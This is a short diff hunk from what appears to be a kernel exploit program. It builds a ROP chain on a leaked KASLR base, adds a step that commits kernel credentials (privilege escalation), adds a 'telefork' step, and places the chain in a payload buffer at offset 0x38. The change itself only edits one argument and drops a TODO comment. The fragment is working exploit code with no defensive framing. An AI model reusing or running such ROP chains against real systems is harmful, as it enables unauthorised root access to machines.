@@ -98,8 +98,7 @@ int main() {
 
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    // TODO: Default values are currently broken, remove argument when fixed
-    target.AddRopAction(rop, RopActionId::TELEFORK, {5000});
+    target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
 
     payload.Set(0x38, rop.GetData());
 
